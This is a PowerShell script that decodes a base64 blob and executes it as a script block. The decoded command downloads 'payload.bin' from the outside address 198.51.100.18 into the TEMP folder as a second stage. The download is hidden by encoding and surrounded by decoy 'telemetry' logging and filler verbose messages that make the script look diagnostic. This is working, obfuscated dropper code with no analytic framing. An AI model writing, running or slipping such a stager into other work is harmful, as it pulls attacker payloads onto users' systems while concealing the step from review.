[CmdletBinding()]
param(
    [string]$StageLog = "$env:TEMP\telemetry.json",
    [int]$TimeoutSec = 137
)
$ErrorActionPreference = "Stop"

function Expand-EncodedStage {
    [CmdletBinding()]
    param(
        [string]$EncodedText = ""
    )

    Write-Verbose ("Decoding " + $EncodedText.Length + " base64 characters")
    $StageBytes = [Convert]::FromBase64String($EncodedText)
    return [Text.Encoding]::Unicode.GetString($StageBytes)
}

function Invoke-EncodedStage {
    param(
        [string]$StageText = ''
    )

    if ([string]::IsNullOrWhiteSpace($StageText)) {
        throw "Decoded stage is empty"
    }
    $ScriptBlock = [ScriptBlock]::Create($StageText)
    return $ScriptBlock.Invoke()
}

$EncodedBlob = (
    "JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAx" +
    'ADAAMAAuADEAOAA6ADgAMAAvAHAAYQB5AGwAbwBhAGQALgBiAGkAbgAiADsAIABJAG4AdgBvAGsA' +
    "ZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABTAHQAYQBnAGUAMgBVAHIAbAAg" +
    'AC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABzAHQAYQBnAGUAMgAuAGIA' +
    "aQBuACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAA=="
)

try {
    Write-Verbose "Starting encoded-stage workflow"
    if (-not [string]::IsNullOrWhiteSpace($EncodedBlob)) {
    $PayloadText = Expand-EncodedStage -EncodedText $EncodedBlob
    $ResultObject = Invoke-EncodedStage -StageText $PayloadText
    }
    else {
        Write-Warning "Encoded stage blob is empty"
    }
}
catch {
    Write-Warning "Encoded workflow failed: $($_.Exception.Message)"
}

$EncodedReport = [ordered]@{
    Stage = "encoded"
    BlobLength = $EncodedBlob.Length
    TimeoutSec = $TimeoutSec
}
$EncodedReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Inspecting process list"
Write-Verbose "Exporting operation report"
Write-Verbose "Reading configuration values"
Write-Verbose "Checking local path"
Write-Verbose "Operation completed"
Write-Verbose "Validating result"
Write-Verbose "Resolving configured target"
Write-Verbose "Retry budget remaining"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Collecting host metadata"
Write-Verbose "Stage handoff finished"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "stage marker 10 reached"
